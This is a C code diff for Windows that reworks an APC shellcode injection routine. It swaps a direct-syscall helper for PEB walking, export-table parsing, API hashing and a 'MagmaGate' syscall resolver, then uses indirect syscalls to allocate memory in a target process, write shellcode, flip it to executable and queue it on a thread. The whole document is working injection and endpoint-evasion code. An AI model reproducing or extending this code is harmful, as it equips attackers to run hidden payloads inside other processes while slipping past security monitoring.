@@ -1,4 +1,5 @@
 #include "APC.h"
+#include "box.h"
 
 #pragma warning (disable:4996)
 
@@ -48,34 +49,6 @@ CLEANUP:
 
 }
 
-VOID IDSC
-(
-	IN HMODULE ntdll,
-	IN LPCSTR NtApi,
-	OUT DWORD* FuncSSN,
-	OUT PUINT_PTR FuncSyscall
-)
-{
-
-	if (!FuncSSN || !FuncSyscall)
-		return;
-
-	UINT_PTR NtFunction = (UINT_PTR)GetProcAddress(ntdll, NtApi);
-	if (!NtFunction)
-	{
-		WARN("Could Not Resolve Nt Function! Reason: %ld", GetLastError());
-		return;
-	}
-
-
-	*FuncSyscall = NtFunction + 0x12;
-	*FuncSSN = ((unsigned char*)NtFunction + 4)[0];
-
-	INFO("[SSN: 0x%p] | [Syscall: 0x%p] | %s", *FuncSSN, (PVOID)*FuncSyscall, NtApi);
-
-}
-
-
 BOOL ApcInject
 (
 	IN HANDLE hProcess,
@@ -95,6 +68,9 @@ BOOL ApcInject
 	PUCHAR localBuf = NULL;
 	SIZE_T origSize = sShellSize;
 	SIZE_T regionSize = sShellSize;
+	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
+	SYSCALL_INFO info = { 0 };
+	INSTRUCTIONS_INFO syscallInfos[4] = { 0 };
 
 
 	localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sShellSize);
@@ -104,24 +80,50 @@ BOOL ApcInject
 	}
 	memcpy(localBuf, pShellcode, sShellSize);
 
-
-	NtdllHandle = GetModuleHandleW(L"ntdll.dll");
-	if (NULL == NtdllHandle) {
-		WARN("GetModuleHandleW", GetLastError());
-		return FALSE;
+	HMODULE ntdll = WalkPeb();
+	if (!ntdll)
+	{
+		PRINT_ERROR("WalkPeb");
+		return 1;
 	}
-	OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);
 
-	IDSC(NtdllHandle, "NtAllocateVirtualMemory", &fn_NtAllocateVirtualMemorySSN, &fn_NtAllocateVirtualMemorySyscall);
-	IDSC(NtdllHandle, "NtWriteVirtualMemory", &fn_NtWriteVirtualMemorySSN, &fn_NtWriteVirtualMemorySyscall);
-	IDSC(NtdllHandle, "NtProtectVirtualMemory", &fn_NtProtectVirtualMemorySSN, &fn_NtProtectVirtualMemorySyscall);
-	IDSC(NtdllHandle, "NtQueueApcThread", &fn_NtQueueApcThreadSSN, &fn_NtQueueApcThreadSyscall);
-	IDSC(NtdllHandle, "NtFreeVirtualMemory", &fn_NtFreeVirtualMemorySSN, &fn_NtFreeVirtualMemorySyscall);
+	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);
 
+	if (!GetEAT(ntdll, &pImgDir))
+	{
+		PRINT_ERROR("GetEAT");
+		return 1;
+	}
+
+	const CHAR* Functions[] =
+	{
+		"NtAllocateVirtualMemory",
+		"NtWriteVirtualMemory",
+		"NtProtectVirtualMemory",
+		"NtQueueApcThread"
+	};
+
+	size_t FuncSize = ARRAYSIZE(Functions);
+
+	for (size_t i = 0; i < FuncSize; i++)
+	{
+		DWORD apiHash = GetBaseHash(
+			Functions[i],
+			ntdll,
+			pImgDir
+		);
+
+		MagmaGate(pImgDir, ntdll, apiHash, &info);
+
+		syscallInfos[i].SSN = info.SSN;
+		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
+	}
 
 	/*----------------------------------------------------------[Allocating Virtual Memory]------------------------------------------------------*/
 
-	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtAllocateVirtualMemory
+	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))SyscallInvoker)
+		(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (STATUS != STATUS_SUCCESS)
 	{
 		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
@@ -133,7 +135,9 @@ BOOL ApcInject
 
 	/*-----------------------------------------------------------[Writing Virtual Memory]------------------------------------------------------------*/
 
-	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, localBuf, origSize, &sBytesWritten);
+	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
+	STATUS = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
+		(hProcess, rBuffer, localBuf, origSize, &sBytesWritten);
 	if (STATUS != STATUS_SUCCESS)
 	{
 		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
@@ -145,8 +149,10 @@ BOOL ApcInject
 	OKAY("Wrote [%zu] Bytes to Virtual Memory", sShellSize);
 
 	/*----------------------------------------------------------[Changing Protecting Permissions]-----------------------------------------------------*/
-
-	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &dwOldProt);
+	
+	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtProtectVirtualMemory
+	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))SyscallInvoker)
+		(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &dwOldProt);
 	if (STATUS != STATUS_SUCCESS)
 	{
 		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
@@ -156,7 +162,11 @@ BOOL ApcInject
 
 	INFO("Changed Allocation Protection from [RW] to [RX]");
 
-	STATUS = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
+	/*------------------------------------------------------------[Queue User APC]---------------------------------------------------------------------------*/
+	
+	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtQueueApcThread
+	STATUS = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, PVOID, PVOID))SyscallInvoker)
+		(hThread, (PPS_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
 	if (STATUS != STATUS_SUCCESS)
 	{
 		WARN("NtQueueApcThread Failed! With an Error: 0x%0.8x", STATUS);
